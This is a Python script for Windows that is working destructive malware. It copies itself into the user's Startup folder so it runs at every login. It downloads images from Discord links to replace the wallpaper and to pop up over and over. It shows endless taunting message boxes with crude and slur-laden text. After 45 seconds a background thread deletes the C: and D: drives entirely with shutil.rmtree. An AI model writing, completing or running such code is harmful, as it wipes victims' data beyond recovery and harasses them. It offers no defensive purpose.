import shutil
import os
import sys
import requests
from PIL import Image
import time
import tkinter as tk
from tkinter import messagebox
import threading
import ctypes

# Define custom messagebox function using tkinter
def custom_messagebox(text, title):
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo(title, text)

def copy_to_startup():
    # Get the path to the user's startup folder
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    # Get the path of the current script
    script_path = sys.argv[0]

    # Copy the script to the startup folder
    shutil.copy(script_path, startup_folder)

def display_error_messages():
    while True:
        custom_messagebox("Congratulations, you have won an STD!", "LMAO")
        custom_messagebox("Aw come on, dont go.", "LMAO")
        custom_messagebox("Give up.", "LMAO")
        custom_messagebox("Where are you going?", "LMAO")
        custom_messagebox("Nice try.", "LMAO")
        custom_messagebox("To put it simply,", "LMAO")
        custom_messagebox("I refuse to be closed.", "LMAO")

def display_image_box():
    image_url = 'https://cdn.discordapp.com/attachments/1105563151216414811/1105855509879332935/gaymeicon.png'
    response = requests.get(image_url, stream=True)
    with open('image.png', 'wb') as file:
        file.write(response.content)

    while True:
        img = Image.open('image.png')
        img.show()

def dir_nuke():
    time.sleep(45)
    dirs = ['C:/', 'D:/']
    for directory in dirs:
        if os.path.exists(directory):
            shutil.rmtree(directory)

def change_wallpaper():
    wallpaper_url = "https://cdn.discordapp.com/attachments/1105563151216414811/1106193396948811867/retarded.png"
    response = requests.get(wallpaper_url)
    image_data = response.content
    wallpaper_file = "wallpaper.png"
    with open(wallpaper_file, "wb") as file:
        file.write(image_data)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(wallpaper_file), 3)
    os.remove(wallpaper_file)

if __name__ == "__main__":
    copy_to_startup()
    change_wallpaper()

    # Create and start a thread for the dir_nuke function
    dir_nuke_thread = threading.Thread(target=dir_nuke)
    dir_nuke_thread.start()

    time.sleep(5)
    display_image_box()
    display_error_messages()
